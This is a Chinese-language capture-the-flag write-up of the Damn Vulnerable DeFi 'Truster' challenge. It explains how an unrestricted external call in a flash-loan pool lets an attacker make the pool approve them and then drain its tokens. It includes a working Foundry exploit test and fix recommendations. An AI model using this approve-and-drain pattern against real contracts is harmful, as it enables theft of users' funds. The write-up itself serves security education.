# Truster
## 一、题目简介

**任意外部调用导致权限泄露**业务逻辑漏洞。

题目背景：借贷池提供免费闪电贷服务，池中存有 **1,000,000 DVT**，攻击者初始余额为 0。

**通关要求**：

1. 仅使用**单笔交易**完成攻击（玩家 nonce = 1）

2. 清空借贷池所有 DVT 资金

3. 将全部资金转入指定 recovery 账户

## 二、合约核心源码 & 漏洞定位

### 漏洞合约：`TrusterLenderPool.sol`

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data); // 【核心漏洞行】

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

### 关键漏洞分析

整道题目有一处致命漏洞：`target\.functionCall\(data\);`

该代码作用：**允许调用者传入任意 target 合约、任意 calldata，让资金池合约代为执行任意外部函数调用**，无任何权限、白名单、调用范围校验。

## 三、审计刷题思维（扫代码流程）

### 1\. 扫高危关键词

合约审计刷题通用技巧，看到以下关键词直接重点分析：

- `functionCall` / `delegatecall` / `call`：任意调用高危函数

- 闪电贷函数：业务逻辑漏洞高发点

### 2\. 代码逻辑推导

1. 合约支持用户自定义 `target` 目标地址和 `data` 调用数据

2. 可以指定 target 为代币合约，data 构造 `approve` 授权调用

3. 最终效果：**资金池自己调用代币授权，授权攻击者无限额度**

### 3\. 校验还款逻辑弱点

合约还款校验规则：仅判断池子最终余额**不低于初始余额**。

因此：**借贷 amount = 0** 时，池子余额不会减少，无需还款，不会触发 `RepayFailed` 报错，完美绕过还款校验。

## 四、完整攻击原理

1. 攻击者调用 `flashLoan`，借贷金额设置为 0，无需归还资产

2. 指定调用目标为 DVT 代币合约，构造 `approve` 调用数据

3. 资金池代为执行授权，给攻击者开放全部代币额度

4. 攻击者通过 `transferFrom` 一次性转走池中所有资金

5. 通过 `vm.setNonce` 满足题目单笔交易限制，完成通关

## 五、EXP

```solidity
function test_truster() public checkSolvedByPlayer {
    // 构造授权 calldata：让资金池授权玩家全部代币额度
    bytes memory data = abi.encodeCall(token.approve, (player, TOKENS_IN_POOL));
    
    // 发起0金额闪电贷，绕过还款校验，执行授权漏洞
    pool.flashLoan(0, player, address(token), data);

    // 利用授权转走池中所有资金到回收账户
    token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);

    // 满足v4单笔交易nonce校验要求
    vm.setNonce(player, 1);
}
```

## 六、运行命令与通关结果

### 运行命令

```bash
forge test --match-contract TrusterChallenge
```

### 输出

```Plain Text
[PASS] test_assertInitialState()
[PASS] test_truster()
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

## 七、考点

1. **任意外部调用漏洞**：无限制的 `functionCall` 导致权限伪造

2. **闪电贷业务逻辑绕过**：0 金额借贷绕过还款校验

3. **代币授权逻辑风险**：合约自主授权属于高危操作

4. **v4 专属规则适配**：满足单笔交易 nonce 限制

## 八、漏洞修复方案

1. **禁用自定义外部调用**：删除可控的 `target\.functionCall\(data\)` 逻辑

2. **增加调用白名单**：仅允许合约调用指定可信地址与函数

3. **禁止0金额闪电贷**：添加最小借贷金额校验，杜绝无效借贷攻击

4. **隔离授权权限**：合约禁止自主调用代币授权、转账等敏感函数

## 九、总结

Truster 是一道 DeFi 业务逻辑漏洞题，核心在于开发者过度开放合约权限，允许用户可控外部调用。攻击者可以利用该漏洞让合约自主授权，窃取全部资金。同时 DVD v4 新增的单笔交易限制，考对测试规则、链上交易 nonce 机制的理解。

